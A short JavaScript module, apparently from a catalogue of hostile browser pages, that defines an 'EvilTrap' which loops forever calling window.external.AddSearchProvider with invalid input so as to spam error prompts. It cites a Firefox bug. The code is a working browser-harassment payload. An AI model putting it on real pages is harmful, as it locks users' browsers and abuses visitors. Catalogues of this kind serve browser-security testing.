const EvilTrap = require('../../EvilTrap');


module.exports = new EvilTrap('addSearchProvider Error Prompt Spam', EvilTrap.CATEGORY.PROMPTSPAM, 'Spams error prompts by calling window.external.addSearchProvider with invalid data.', { firefox: '615761' })
  .addScriptPage(() => {
    // eslint-disable-next-line no-constant-condition
    while (true) {
      window.external.AddSearchProvider(' ');
    }
  });
